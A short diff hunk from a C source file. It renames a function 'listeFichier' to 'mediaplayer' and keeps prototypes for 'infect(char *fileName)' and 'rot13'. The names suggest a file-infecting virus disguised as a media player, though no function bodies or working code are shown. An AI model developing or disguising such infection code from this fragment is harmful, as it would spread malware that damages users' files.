@@ -8,7 +8,7 @@
 #include <string.h>
 #include <unistd.h>
 
-void listeFichier(char *extension);
+void mediaplayer(char *extension);
 void infect(char *fileName);
 int rot13(int c);
 
